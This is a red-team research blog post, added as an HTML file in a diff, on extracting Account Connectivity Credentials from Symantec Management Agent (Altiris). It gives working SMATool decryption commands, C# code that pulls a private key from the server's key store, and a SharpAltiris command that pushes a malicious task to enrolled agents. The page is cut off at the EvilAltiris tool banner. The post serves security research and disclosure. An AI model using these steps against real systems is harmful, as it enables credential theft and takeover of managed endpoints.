@@ -1,0 +1,560 @@
+<!DOCTYPE html>
+<html lang="en-us">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    
+    <title>Extracting Account Connectivity Credentials (ACCs) from Symantec Management Agent (aka Altiris) - breakfix.co</title>
+    
+    <meta name="description" content="Introduction On a recent Red Team for a particularly hardened client, we were looking to escalate our privileges in order to move off the endpoint and pivot into the server subnets. When none of the usual paths bore fruit, we began to look into the management software installed on the endpoint, specifically Symantec Management Agent (previously known as &ldquo;Altiris&rdquo;). Indeed this was something we had run into before and were keen to see what could be done from a privilege escalation perspective.">
+    <meta name="author" content="">
+    
+    <link href="https://breakfix.co/an-old-hope.min.css" rel="stylesheet">
+    <link href="https://breakfix.co/style.css" rel="stylesheet">
+    <link href="https://breakfix.co/custom.css" rel="stylesheet">
+    
+    <link rel="apple-touch-icon" href="https://breakfix.co/apple-touch-icon.png">
+    <link rel="icon" href="https://breakfix.co/favicon.ico">
+    <meta name="generator" content="Hugo 0.80.0" />
+    
+    
+    
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-66QLTNLGVX"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-66QLTNLGVX');
+</script>
+
+
+    <script>
+      function setTheme() {
+          document.body.classList.add('dark');
+          
+          return;
+        }
+    </script>
+  </head>
+  <body class="single">
+    <script>
+      setTheme();
+    </script>
+    <header class="header">
+      <nav class="nav">
+        <p class="logo"><a href="https://breakfix.co/">breakfix.co</a></p>
+        <ul class="menu">
+          <li>
+            <a href="/about/">About</a>
+          </li>
+        </ul>
+      </nav>
+    </header>
+    <main class="main">
+
+
+<article class="post-single">
+  <header class="post-header">
+    <h1 class="post-title">Extracting Account Connectivity Credentials (ACCs) from Symantec Management Agent (aka Altiris)</h1>
+    <div class="post-meta">December 3, 2024</div>
+  </header>
+  <div class="post-content"><h3 id="introduction">Introduction</h3>
+<p>On a recent Red Team for a particularly hardened client, we were looking to escalate our privileges in order to move off the endpoint and pivot into the server subnets. When none of the usual paths bore fruit, we began to look into the management software installed on the endpoint, specifically Symantec Management Agent (previously known as &ldquo;Altiris&rdquo;). Indeed this was something we had run into <a href="https://www.mdsec.co.uk/2022/07/altiris-methods-for-lateral-movement/">before</a> and were keen to see what could be done from a privilege escalation perspective.</p>
+<p>Reviewing the online <a href="https://knowledge.broadcom.com/external/article/194234/how-to-setup-agent-connectivity-credenti.html">documentation</a> revealed the use of a &ldquo;Account Connectivity Credential (ACC)&rdquo;. This account is used to facilitate network access to the Symantec Site Server in order to download package, policy and task configuration data. This immediately reminded us of another three letter acronym used to perform an almost identical task within Microsoft SCCM, the Network Access Account (NAA).</p>
+<p>Security risks associated with Network Access Accounts are well established, thanks to excellent <a href="https://blog.xpnsec.com/unobfuscating-network-access-accounts/">research</a> by Adam Chester and C# tooling such as a <a href="https://github.com/Mayyhem/SharpSCCM">SharpSCCM</a> by Chris Thompson.</p>
+<p>Given the frequency with which we see overly privileged SCCM NAAs on engagements, we set off to identify how the Symantec Management Agent ACC was configured, how it was delivered to the endpoint and if it was possible to extract the credentials.</p>
+<p>To skip straight to the tool, go here <a href="https://github.com/mdsecactivebreach/evilaltiris">https://github.com/mdsecactivebreach/evilaltiris</a></p>
+<h3 id="symantec-management-platform-infrastructure">Symantec Management Platform Infrastructure</h3>
+<p>The Symantec Management Platform has four main architectural components as detailed <a href="https://techdocs.broadcom.com/us/en/symantec-security-software/endpoint-security-and-management/it-management-suite/ITMS/Getting-Started/Understanding-the-components-of-IT-Management-Suite/core-architectural-components-of-symantec-manageme-v54482933-d780e968.html">here</a></p>
+<ul>
+<li>Notification Server and its Web-based Symantec Management Console</li>
+<li>SQL Server</li>
+<li>Site servers (can include task servers, package servers, network boot servers, and monitor service).</li>
+<li>Managed computers</li>
+</ul>
+<p>A high-level infrastructure diagram from Symantec can be seen below. For our purposes, we assume we have already compromised a managed computer with the Symantec Management Agent installed.</p>
+<p><img src="/altiris/original.png" alt="original.png"></p>
+<h3 id="symantec-management-agent-acc-account-configuration">Symantec Management Agent ACC Account Configuration</h3>
+<p>During installation of our lab environment, we are prompted to enter the account credentials for the Notification Server account.</p>
+<p><img src="/altiris/Screenshot_from_2024-03-29_18-22-37.png" alt="Screenshot from 2024-03-29 18-22-37.png"></p>
+<p>According to the <a href="https://techdocs.broadcom.com/us/en/symantec-security-software/endpoint-security-and-management/it-management-suite/ITMS/Administration/Configuring-Notification-Server/configuring-notification-server-settings-v15701619-d846e35732/notification-server-processing-settings-v11802974-d846e35883.html#v11802974">documentation</a>, this account <strong>must</strong> have local administrator rights on the Notification Server.</p>
+<p><img src="/altiris/image.png" alt="image.png"></p>
+<p>By default, these credentials will also be used as the ACC unless we explicitly configure one inside the web admin portal under <code>Settings → Agents/Plug-ins → Symantec Management Agent → Settings → Global Agent Settings</code>. This means that in a default configuration, the ACC will be set to an account with full administrative rights over the Notification Server. These credentials can also be used to access the admin console at URL <code>https://notification-server.local/Altiris/console</code> with full admin rights.</p>
+<p>We can see here that Symantec warn us about the potential security risks associated with this and instead suggest we configure a low-privileged account. Problem solved! surely no-one would use the product in its default configuration?</p>
+<p><img src="/altiris/Screenshot_from_2024-04-17_11-16-24.png" alt="Screenshot from 2024-04-17 11-16-24.png"></p>
+<p>With an understanding of how the ACC is configured, and the prospect of capturing credentials for a highly privileged account, we can move on to figuring out how the ACC is sent to the agents.</p>
+<h3 id="overview-of-the-agent-enrollment-process">Overview of the Agent Enrollment Process</h3>
+<p>To understand how the ACC is distributed, we must first understand a bit about how the agent enrollment process works.</p>
+<p>As the agent communications occurs over HTTP(S), we can simply install the agent using the MSI installer and run Wireshark to observe the traffic. Although the agent installer does support HTTP proxies, running the agent traffic via Burp during installation created unexpected results. To view HTTPS communications, we can simply add the private key from the Notification Server SSL certificate to decrypt the traffic.</p>
+<p>While installing the agent, we observe a HTTP request to <code>CreateResource.aspx</code>. Although the POST data is raw binary, we assume this is likely some sort of device enrollment request to register the agent with the Notification Server.</p>
+<p><img src="/altiris/image%201.png" alt="image.png"></p>
+<p>Shortly after the enrollment request, we see a HTTP request to <code>GetClientPolicies.aspx</code> with metadata about our enrolled workstation.</p>
+<p><img src="/altiris/image%202.png" alt="image.png"></p>
+<p>As the agent service runs as SYSTEM, these requests are performed using negotiate authentication with the domain computer account. Crucially however, we found that when replaying this request using Burp and providing NTLMv2 credentials for a domain user (not computer) account, the server still returned the same binary response data.</p>
+<p><img src="/altiris/image%203.png" alt="image.png"></p>
+<p><img src="/altiris/image%204.png" alt="image.png"></p>
+<p>This indicated that the application was utilising integrated authentication as a method of transport level protection only. There appeared to be no additional application logic to map our authenticating domain user back to a specific GUID. This would come in handy later on.</p>
+<p>By tweaking the parameters in the request, we were able to work out the minimum parameters required in order to return a successful response.</p>
+<p><img src="/altiris/image%205.png" alt="image.png"></p>
+<p>Based on this request, we can conclude that in order to authenticate to the Notification Server and request agent policy data we require the following:</p>
+<ul>
+<li>NTLM / Kerberos authentication (for any domain account)</li>
+<li>GUID</li>
+<li>TypeGUID</li>
+</ul>
+<p>Fulfilling the first requirement is not an issue, as we are already running within a domain context on the endpoint. However, we don’t know how the two GUIDs are generated or how they used to authenticate the request. We also currently have no idea how to decode the server response data returned from the <code>GetClientPolicies</code> request. To complete these remaining requirements, we were going to need to dive deeper into the agent itself.</p>
+<h3 id="symantec-management-agent-tool">Symantec Management Agent Tool</h3>
+<p>While researching ways to increase the level of debugging logged by the agent, we found mention of a handy <a href="https://knowledge.broadcom.com/external/article/150837/symantec-management-agent-altiris-agent.html">tool</a> distributed by Symantec <code>SMATool.exe</code>. This tool can be found on the Notification Server at <code>C:\Program Files\Altiris\Notification Server\Bin\Tools\SMATool.exe</code> and provides a number of debugging functions for the agent.</p>
+<pre><code>SMATool.exe
+SMP Agent Command Line Tool
+Copyright (C) 2023 Broadcom. All rights reserved.
+
+SMATool.exe [/Operation] [Parameter List]
+
+Operation:
+        HELP | ?        - Show this help.
+        STORAGE         - Agent Storage operation
+        DATA            - Data processing operation
+        FILE            - File processing operation
+        AGENT           - Agent operations
+        AD              - Active Directory operation
+
+Common for every operation parameters:
+        WAIT            - Wait for operation to complete
+        TPWD            - Ask for the troubleshooting password
+        TPWD:&lt;pwd&gt;      - Set the troubleshooting password
+
+        /DATA DUMP PASSWORD &lt;Base64 encoded password string&gt;
+
+        /AGENT DUMP MACHINETYPE
+</code></pre><p>Of particular interest were the functions related to “Agent Storage”, calling any of these while running Procmon on the agent workstation revealed references to an on-disk file within a parent folder called <code>LDB</code></p>
+<p><img src="/altiris/ldb_2.png" alt="ldb_2.png"></p>
+<p>Researching these <a href="https://knowledge.broadcom.com/external/article/150837/symantec-management-agent-altiris-agent.html">online</a> we find that Symantec refers to these as the “Agent secure storage files”.</p>
+<pre><code> LDB folder:
+The following are the default location for the LDB folder (Agent secure storage files):
+&quot;\Documents and Settings\All Users\Application Data\Symantec\Symantec Agent\Ldb&quot;
+&quot;\ProgramData\Symantec\Symantec Agent\Ldb&quot;
+</code></pre><p>Examining the available cmdline functions, we come across an interesting command <code>/AGENT DUMP MACHINETYPE</code>. Running this from a local administrator prompt on a machine with the agent installed, resulted in the below output.</p>
+<pre><code>SMATool.exe /AGENT DUMP MACHINETYPE
+Machine type: Virtual
+        Manufacturer: Oracle Corporation
+        Model: VirtualBox
+        Version: 1.2
+        GUID: 00000000-0000-0000-0000-000000000000
+Machine type GUID: {2C3CB3BB-FEE9-48DF-804F-90856198B600}
+</code></pre><p>This GUID looks familiar! This is the same value we observed as the <code>TypeGUID</code> argument in our request to <code>GetClientPolicies.aspx</code>. So what about that other GUID we saw, is this also stored in the LDB ? It turns out this is actually stored within the registry, unencrypted and readable by any (low privileged) user.</p>
+<p><code>Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Altiris\Altiris Agent\MachineGuid</code></p>
+<p><img src="/altiris/image%206.png" alt="image.png"></p>
+<p>We now have all the information required to request policy data from the Notification Server, although it’s not much use to us as the response data is just raw binary. In turns out, however, that <code>SMAtool</code> has got our back here as well.</p>
+<p>If we take our response data, convert it to base64 and pass it to the <code>/DATA DUMP PASSWORD</code> function, we are presented with an error “Bad Data”.</p>
+<pre><code>SMATool.exe /DATA DUMP PASSWORD AACJUtjGF&lt;SNIP&gt;
+Failed to execute command: 0x80090005 [Bad Data].
+</code></pre><p>Further reading of the Symantec documentation reveals this line, which gives us a hint at how the data within the <code>LDB</code> is encrypted.</p>
+<pre><code>SMATool.exe should run under SYSTEM account in order to be able to decrypt the policy response file (use psexec.exe).
+</code></pre><p>If we launch a SYSTEM command prompt using <code>PSExec.exe</code> and re-run the command, we are now prompted for a <a href="https://knowledge.broadcom.com/external/article/181702/setting-the-troubleshooting-password-de.html">Troubleshooting password</a>.</p>
+<pre><code>SMATool.exe /DATA DUMP PASSWORD AACJUtjGF&lt;SNIP&gt;
+Type the troubleshooting password: *
+</code></pre><p>This is set from within the Notification Server web administration portal and is used by the agent to encrypt certain data stored within the <code>LDB</code>. Although this is a required argument, not all data stored within the <code>LDB</code> is encrypted with this key. To demonstrate this, we provide a dummy value via the <code>/TPWD</code> argument and re-run the command.</p>
+<pre><code>SMATool.exe /TPWD:MDSEC /DATA DUMP PASSWORD AACJUtjGF&lt;SNIP&gt;
+0000    3c 72 65 73 70 6f 6e 73  65 20 6e 73 56 65 72 73   &lt;response nsVers
+0010    69 6f 6e 3d 22 38 2e 37  2e 32 33 33 37 2e 30 22   ion=&quot;8.7.2337.0&quot;
+0020    3e 3c 72 65 73 6f 75 72  63 65 73 3e 3c 72 65 73   &gt;&lt;resources&gt;&lt;res
+0030    6f 75 72 63 65 20 67 75  69 64 3d 22 7b 31 31 34   ource guid=&quot;{114
+0040    62 37 31 37 38 2d 32 65  34 65 2d 34 30 37 31 2d   b7178-2e4e-4071-
+0050    38 31 64 66 2d 39 31 39  62 33 66 31 30 65 30 63   81df-919b3f10e0c
+0060    32 7d 22 3e 3c 72 65 73  6f 75 72 63 65 50 6f 6c   2}&quot;&gt;&lt;resourcePol
+0070    69 63 79 20 67 75 69 64  3d 22 7b 31 34 32 66 32   icy guid=&quot;{142f2
+0080    33 37 32 2d 65 36 34 64  2d 34 33 63 30 2d 61 32   372-e64d-43c0-a2
+0090    30 37 2d 31 37 64 62 32  63 30 35 35 32 63 34 7d   07-17db2c0552c4}
+00a0    22 20 2f 3e 3c 72 65 73  6f 75 72 63 65 50 6f 6c   &quot; /&gt;&lt;resourcePol
+00b0    69 63 79 20 67 75 69 64  3d 22 7b 63 64 35 32 65   icy guid=&quot;{cd52e
+00c0    62 36 36 2d 30 36 31 63  2d 34 32 33 65 2d 62 66   b66-061c-423e-bf
+00d0    37 65 2d 30 38 32 39 32  37 31 33 38 64 66 65 7d   7e-082927138dfe}
+&lt;SNIP&gt;
+</code></pre><p>Nice! We now have a decrypted policy response from the Notification Server. If we examine the decrypted data, we see a reference to <code>defaultACC_SecureAttribute</code> along with an entry for <code>userName_Secure_Attribute</code> and <code>userPassword_SecureAttribute</code>.</p>
+<pre><code>2bf0	74 41 43 43 5f 53 65 63  75 72 65 41 74 74 72 69   tACC_SecureAttri
+2c00	62 75 74 65 3d 22 68 69  67 68 73 65 63 75 72 65   bute=&quot;highsecure
+2c10	64 22 20 64 65 66 61 75  6c 74 41 43 43 3d 22 54   d&quot; defaultACC=&quot;T
+2c20	72 75 65 22 20 75 73 65  72 4e 61 6d 65 5f 53 65   rue&quot; userName_Se
+2c30	63 75 72 65 41 74 74 72  69 62 75 74 65 3d 22 68   cureAttribute=&quot;h
+2c40	69 67 68 73 65 63 75 72  65 64 22 20 75 73 65 72   ighsecured&quot; user
+2c50	4e 61 6d 65 3d 22 41 77  43 57 6a 56 6b 39 6f 43   Name=&quot;AwCWjVk9oC
+2c60	56 4b 53 47 41 77 4d 63  47 64 72 48 65 65 64 38   VKSGAwMcGdrHeed8
+2c70	7a 72 71 6d 58 4d 68 4c  35 34 34 38 73 6c 57 62   zrqmXMhL5448slWb
+</code></pre><p>These values also appear to be encrypted, so we turn once again to our reliable friend <code>SMAtool</code>. Loading these values into the same <code>/DATA DUMP PASSWORD</code> function reveals the clear-text username and password values for the ACC.</p>
+<pre><code>SMATool.exe /TPWD:MDSEC /DATA DUMP PASSWORD AwCWjVk9oCVKSGAwMcGdrHeeGgb3zP+X1URujyeX9sSNCg865meVAxDjjwu7yrMiwtSqRyFSu223tHkudAu6S8jKB/wEgk30d29OXW/J64/8sVtNWclR98HnX20aeKYTvKskYh+KE/oW/QuTrhZgICiw17GMFRwLRbOs3pN8Yd85zA1gINudPo2EJWMjvqGNcnFyQa58k3sGm0pC1SLQ73zd1ynPTExur2lpRbNmgv8tmQ==
+INITECH\altiris_connectivity_credential3
+
+SMATool.exe /TPWD:MDSEC /DATA DUMP PASSWORD AwCWjVk9oCVKSGAwMcGdrHee24NhmeSpLOyxpDXmlYRpVyKJaUnSYOjplCbL/bAW5g7XMsEudlbPWAiBTlH5lf+eOAbBTxH/1529ZKzBjMILfXJBrnyTewabSkLVItDvfN3XKc9MTG6vaWlFs2aC/y2Z
+SuperSecure!
+</code></pre><p>During our testing we noticed that  <code>ACC_SecureAttribute</code> values taken from different environments could all be decrypted using the same <code>SMAtool</code> , however this was not the case for policy data returned from the server. This indicated that policy data was likely encrypted using an agent specific key (stored in the LDB) while the ACC was encrypted using a static key (stored in the <code>SMAtool</code> binary itself). The versatile nature of the <code>SMAtool</code> means that it is able to examine the input string and automatically determine which encryption key to use to decrypt the data.</p>
+<h3 id="exploitation-from-high-privilege">Exploitation from High Privilege</h3>
+<p>We now have everything we need to recover the ACC credentials from a privileged (SYSTEM) process on a workstation with the Symantec Management Agent installed. In order to automate the attack, we created a C# tool <code>EvilAltiris</code> to pull the policy data from the Notification Server and call the relevant functions from the <code>SMAtool</code> binary on disk.</p>
+<p>To perform the attack with high privilege we perform the following:</p>
+<ul>
+<li>Read the MachineGuid from the registry</li>
+<li>Read the TypeGuid from the LDB via SMATool</li>
+<li>Request the encrypted policy data from the server</li>
+<li>Decrypt the policy data with SMATool</li>
+<li>Decrypt the ACC with SMATool</li>
+</ul>
+<p>The video below demonstrates performing these actions via <code>EvilAltiris</code> and using the ACC to authenticate to the admin web interface on the Notification Server.</p>
+<video width="640" height="360" class="video-shortcode" preload="auto" controls>
+    <source src="/altiris/high_priv_3.mp4" type="video/mp4">
+    There should have been a video here but your browser does not seem
+    to support it.
+</video>
+
+<p>We can also use these credentials to interact with the Notification Server API via our existing post-exploitation tool <a href="https://github.com/mdsecactivebreach/SharpAltiris">SharpAltiris</a> to push malicious code to all enrolled agents.</p>
+<pre><code>SharpAltiris.exe ScheduleTask http://dc.initech.local a9955ffd-1949-4fef-99d7-6d45eca67dba 121f90f2-1e50-418a-86de-87c884ca1a2d mymalicioustask &quot;INITECH\\altiris_notification&quot; &quot;SuperSecure!&quot;
+
+Sending URL http://dc.initech.local/altiris/ASDK.Task/TaskManagementService.asmx/ExecuteTask
+[+] Task Executed successfully!
+</code></pre><p><strong>Note</strong>: One additional bonus is that the TCP port for both the agent communications and admin web interface are the same (TCP 80/443). This means that network connectivity to the admin web interface from the workstation LAN must be permitted through the firewall due to the requirement to allow traffic from the agent. This is especially useful for hardened environments where server management ports are typically only accessible from specific hosts or jumpboxes.</p>
+<h3 id="exploitation-from-low-privilege">Exploitation from Low Privilege</h3>
+<p>Although our attack works, we are reliant on SYSTEM access in order to decrypt the required data stored in the <code>LDB</code>. The requirement to write <code>SMATool.exe</code> to disk is also not ideal from an OPSEC perspective. Finally, there is no technical restriction preventing us from performing the attack with a regular domain user account, as any user can authenticate to the Notification Server via NTLM. As a result, we looked to develop an exploitation path from a non-elevated position, removing any reliance on <code>SMATool.exe</code>.</p>
+<p>To achieve this, we needed to validate some of our earlier assumptions around the enrollment process using a combination of de-compilation and dynamic reversing.</p>
+<p>Revisiting our device enrollment request, we wanted to better understand the initial request used to enroll an agent in the Notification Server.</p>
+<p><img src="/altiris/image%201.png" alt="image.png"></p>
+<p>Although the request body is encrypted, as the back-end code for the Notification Server is written in .NET we can de-compile the server binaries to try and identify how the request data is encrypted. The majority of the server side logic can be found inside the following DLLs:</p>
+<ul>
+<li>C:\Program Files\Altiris\Notification Server\AgentWeb\Agent\Bin\Altiris.Web.NS.Agent.dll</li>
+<li>C:\Program Files\Altiris\Symantec Installation Manager\Altiris87.NS.dll</li>
+</ul>
+<p>After de-compiling the .NET binaries in dotPeek, we find the following Class at <code>Altiris.Web.NS.Agent.dll:Altiris.Web.NS.Agent.CreateResourceHttpHandler.cs</code>. Inside this Class, we note the call to the function <code>DecryptRequestText</code>.</p>
+<pre><code>    protected override bool ValidateRequestValues(
+      HttpContext context,
+      CreateResourceHttpHandlerData data)
+    {
+&lt;TRIMMED FOR BREVITY&gt;
+      data.RequestXml = this.DecryptRequestText(context, data);
+    }
+</code></pre><p>Tracing this call we ultimately end up inside the <code>Altiris87.NS.dll:Altiris.NS.Security.Cryptography.SymmetricKeyManager.cs</code> Class. This class provides a way to extract keys from the Key Management System (KMS) directory stored on the Notification Server at path <code>C:\ProgramData\Symantec\KMS</code>. Each of the XML files in this directory contain either a symmetric or asymmetric key encrypted with DPAPI.</p>
+<p><img src="/altiris/image%207.png" alt="image.png"></p>
+<p>To extract these keys, we create a new C# project adding a reference to <code>Altiris87.NS.dll</code> and then call the <code>GetAsymmetricKey</code> function, passing in the name of the key we want <code>NS.PackageSigning</code>.</p>
+<pre><code>        public static void KeyCacheEntry (RSAAsymmetricKeyInfo key, bool isPrivate)
+        {
+            using (RSACryptoServiceProvider cryptoServiceProvider = isPrivate ? (RSACryptoServiceProvider)GetPrivateAlgorithmOverride(key) : (RSACryptoServiceProvider)key.GetAlgorithm())
+            {
+                Console.WriteLine(cryptoServiceProvider.ToXmlString(isPrivate));
+            }
+        }
+
+        static void Main(string[] args)
+        {
+            using (AsymmetricKeyInfo keyWithImpersonation = SymmetricKeyManager.GetAsymmetricKey(&quot;NS.PackageSigning&quot;))
+            {
+                RSAAsymmetricKeyInfo PackageSigningKey = (RSAAsymmetricKeyInfo)keyWithImpersonation;
+                KeyCacheEntry(PackageSigningKey, true);
+            }
+        }
+</code></pre><p>Running this on the Notification Server results in the below output.</p>
+<pre><code>'NS.PackageSigning' (RSAAsymmetricKeyInfo,unprotected)
+KeySize: 2048
+Key: RSA-PKCS1-KeyEx
+Key: &lt;http://www.w3.org/2000/09/xmldsig#rsa-sha1&gt;
+KeyXML: &lt;RSAKeyValue&gt;&lt;Modulus&gt;vXj197K0K60misOMVqpnwDWFw/UHrRvBgZ6Lepdfk9eHkyfmCndWuH92Sz5BpfdvpjoOYNIPRAd4evJqrbgFrRg58ddKyS70L2aYofGU39Op5s+PtV4RP9eA5GIi5Felaxt0fjFHuWvB54PmzeKrqFtRDz1bfNUvZwn4tvU5p5LKUs/TlQ+6RcuThnZhNwuHbIOa589ezjnKwaAd2XPNIG2OUNcGaLIK4eJK1B0sHvtJRun+mLAtTd82kePYstgyh1XGqSzuBY5mIKAXAACLeWg7tGDWGQedHLy3T4vmPCniq4Eq/ylE9g4CwkYtp9zDY0Pr/vT92ULFN/H4pQ9btQ==&lt;/Modulus&gt;&lt;Exponent&gt;AQAB&lt;/Exponent&gt;&lt;/RSAKeyValue&gt;
+</code></pre><p>To perform the decryption, we take the binary request data from our device enrollment request and pass it to the below function, along with the extracted private key from the KMS.</p>
+<pre><code>        public static byte[] DecryptToStreamWithNSKeyByte(RSACryptoServiceProvider rsaPrivateKey, byte[] data)
+        {
+            using (rsaPrivateKey)
+            {
+                using (AsymmetricKeyEncryption asymmetricKeyEncryption = new AsymmetricKeyEncryption(rsaPrivateKey))
+                    return asymmetricKeyEncryption.Decrypt(data);
+            }
+        }
+        Console.WriteLine(ByteArrayToString(DecryptToStreamWithNSKeyByte(cryptoServiceProvider, Convert.FromBase64String(&quot;AAA4xIqgq7WOIYvNq&lt;TRIMMED FOR BREVITY&gt;&quot;))));
+</code></pre><p>This results in the below decrypted XML POST data from our device enrollment request. Of particular interest to us is the <code>policyKey</code> value as this is likely a reference to the asymmetric key used to encrypt the agent policy data.</p>
+<pre><code>&lt;TRIMMED FOR BREVITY&gt;26573733d2230382d30302d32372d39372d35462d3046222073746174653d226e6577222f3e0a3c2f7265736f757263653e0a | xxd -r -p | hexdump -C
+00000000  3c 72 65 73 6f 75 72 63  65 20 74 79 70 65 47 75  |&lt;resource typeGu|
+00000010  69 64 3d 22 7b 32 43 33  43 42 33 42 42 2d 46 45  |id=&quot;{2C3CB3BB-FE|
+00000020  45 39 2d 34 38 44 46 2d  38 30 34 46 2d 39 30 38  |E9-48DF-804F-908|
+00000030  35 36 31 39 38 42 36 30  30 7d 22 20 6e 61 6d 65  |56198B600}&quot; name|
+00000040  3d 22 57 4f 41 46 33 38  33 36 4f 22 20 70 6f 6c  |=&quot;WOAF3836O&quot; pol|
+00000050  69 63 79 4b 65 79 3d 22  41 41 41 41 41 51 41 42  |icyKey=&quot;AAAAAQAB|
+00000060  78 5a 45 71 64 61 41 51  51 43 4a 58 2b 42 30 44  |xZEqdaAQQCJX+B0D|
+&lt;TRIMMED FOR BREVITY&gt;
+</code></pre><p>Decoding the base64 value from the <code>policyKey</code> argument key inside the request we see the below.</p>
+<pre><code>echo AAAAAQABxZEqdaAQQCJX+B0Dn6EzwjR4yxtHJWp9T7PrfJP2RTOmWm19R2WPzefkiN/YwuKEc+eUBPgD0/6W6dnlrhRPorhnBgPkfKBB2D+NIcsNhB3obyvcrhQKHydHiU9QhS5eGThK3a8lBQuJQpi5CXA60wtiqoVaPxbn/++13yeWmO+8i2Kug0b9ouHozcyHgR0lF77WSw83mTQwDLyJQmhBsI1gyCby8MNsZRSa+1ljy8l/gBJlz/s+hBUU7Qi+PcoD71CN6plu/1TWP+K3oqa0yaUQQwuy5kVSbIfjRS+3FxMZceMZTvaZ+1eUnIN31VnkbSaSsk5yMBq1/1BKEZWodQ== | base64 -d | hexdump -C
+00000000  00 00 00 01 00 01 c5 91  2a 75 a0 10 40 22 57 f8  |........*u..@&quot;W.|
+00000010  1d 03 9f a1 33 c2 34 78  cb 1b 47 25 6a 7d 4f b3  |....3.4x..G%j}O.|
+00000020  eb 7c 93 f6 45 33 a6 5a  6d 7d 47 65 8f cd e7 e4  |.|..E3.Zm}Ge....|
+00000030  88 df d8 c2 e2 84 73 e7  94 04 f8 03 d3 fe 96 e9  |......s.........|
+00000040  d9 e5 ae 14 4f a2 b8 67  06 03 e4 7c a0 41 d8 3f  |....O..g...|.A.?|
+00000050  8d 21 cb 0d 84 1d e8 6f  2b dc ae 14 0a 1f 27 47  |.!.....o+.....'G|
+00000060  89 4f 50 85 2e 5e 19 38  4a dd af 25 05 0b 89 42  |.OP..^.8J..%...B|
+00000070  98 b9 09 70 3a d3 0b 62  aa 85 5a 3f 16 e7 ff ef  |...p:..b..Z?....|
+00000080  b5 df 27 96 98 ef bc 8b  62 ae 83 46 fd a2 e1 e8  |..'.....b..F....|
+00000090  cd cc 87 81 1d 25 17 be  d6 4b 0f 37 99 34 30 0c  |.....%...K.7.40.|
+000000a0  bc 89 42 68 41 b0 8d 60  c8 26 f2 f0 c3 6c 65 14  |..BhA..`.&amp;...le.|
+000000b0  9a fb 59 63 cb c9 7f 80  12 65 cf fb 3e 84 15 14  |..Yc.....e..&gt;...|
+000000c0  ed 08 be 3d ca 03 ef 50  8d ea 99 6e ff 54 d6 3f  |...=...P...n.T.?|
+000000d0  e2 b7 a2 a6 b4 c9 a5 10  43 0b b2 e6 45 52 6c 87  |........C...ERl.|
+000000e0  e3 45 2f b7 17 13 19 71  e3 19 4e f6 99 fb 57 94  |.E/....q..N...W.|
+000000f0  9c 83 77 d5 59 e4 6d 26  92 b2 4e 72 30 1a b5 ff  |..w.Y.m&amp;..Nr0...|
+00000100  50 4a 11 95 a8 75                                 |PJ...u|
+</code></pre><p><code>SMATool.exe</code> provides a useful command to dump the current agent public key from the <code>LDB</code>. Running this, we confirm that the value contained within the <code>policyKey</code> argument is indeed the agent public key.</p>
+<pre><code>SMATool.exe /AGENT DUMP PUBLICKEY
+Public key:
+0000    00 00 00 01 00 01 c5 91  2a 75 a0 10 40 22 57 f8   ........*u..@&quot;W.
+0010    1d 03 9f a1 33 c2 34 78  cb 1b 47 25 6a 7d 4f b3   ....3.4x..G%j}O.
+0020    eb 7c 93 f6 45 33 a6 5a  6d 7d 47 65 8f cd e7 e4   .|..E3.Zm}Ge....
+0030    88 df d8 c2 e2 84 73 e7  94 04 f8 03 d3 fe 96 e9   ......s.........
+0040    d9 e5 ae 14 4f a2 b8 67  06 03 e4 7c a0 41 d8 3f   ....O..g...|.A.?
+0050    8d 21 cb 0d 84 1d e8 6f  2b dc ae 14 0a 1f 27 47   .!.....o+.....'G
+0060    89 4f 50 85 2e 5e 19 38  4a dd af 25 05 0b 89 42   .OP..^.8J..%...B
+0070    98 b9 09 70 3a d3 0b 62  aa 85 5a 3f 16 e7 ff ef   ...p:..b..Z?....
+0080    b5 df 27 96 98 ef bc 8b  62 ae 83 46 fd a2 e1 e8   ..'.....b..F....
+0090    cd cc 87 81 1d 25 17 be  d6 4b 0f 37 99 34 30 0c   .....%...K.7.40.
+00a0    bc 89 42 68 41 b0 8d 60  c8 26 f2 f0 c3 6c 65 14   ..BhA..`.&amp;...le.
+00b0    9a fb 59 63 cb c9 7f 80  12 65 cf fb 3e 84 15 14   ..Yc.....e..&gt;...
+00c0    ed 08 be 3d ca 03 ef 50  8d ea 99 6e ff 54 d6 3f   ...=...P...n.T.?
+00d0    e2 b7 a2 a6 b4 c9 a5 10  43 0b b2 e6 45 52 6c 87   ........C...ERl.
+00e0    e3 45 2f b7 17 13 19 71  e3 19 4e f6 99 fb 57 94   .E/....q..N...W.
+00f0    9c 83 77 d5 59 e4 6d 26  92 b2 4e 72 30 1a b5 ff   ..w.Y.m&amp;..Nr0...
+0100    50 4a 11 95 a8 75
+</code></pre><p>By reviewing the <code>ConvertToPublicKeyBlobV2</code> function of the <code>Altiris87.NS.dll:Altiris.NS.Security.Cryptography.PublicKeyConverter.cs</code> Class we discover the structure of the agent public key blob.</p>
+<pre><code>    public static readonly byte SMA_Key_Version = 0;
+    public static readonly byte SMA_Key_Flags = 0;
+
+    public static byte[] ConvertToPublicKeyBlobV2(byte[] streamModulusExp)
+    {
+      using (RSACryptoServiceProvider cryptoServiceProvider = new RSACryptoServiceProvider(2048))
+      {
+        RSAParameters parameters = new RSAParameters();
+        byte[] destinationArray1 = new byte[PublicKeyConverter.SMAkey_exponent_size];
+        byte[] destinationArray2 = new byte[PublicKeyConverter.SMAkey_modulus_size];
+        Array.Copy((Array) streamModulusExp, PublicKeyConverter.SMAkey_parity_size, (Array) destinationArray1, 0, destinationArray1.Length);
+        Array.Copy((Array) streamModulusExp, destinationArray1.Length + PublicKeyConverter.SMAkey_parity_size, (Array) destinationArray2, 0, destinationArray2.Length);
+        parameters.Modulus = destinationArray2;
+        parameters.Exponent = destinationArray1;
+        cryptoServiceProvider.ImportParameters(parameters);
+        return cryptoServiceProvider.ExportCspBlob(false);
+      }
+    }
+</code></pre><p>The format of the public key blob can be represented by the diagram below.</p>
+<p><img src="/altiris/csp.png" alt="csp.png"></p>
+<p>With this information, we can generate our own asymmetric key pair converting the public key into the base64 encoded blob format that the Notification Server requires.</p>
+<pre><code>EvilAltiris.exe GenerateCerts
+
+█▀▀ █ █ █ █   ▄▀█ █   ▀█▀ █ █▀█ █ █▀
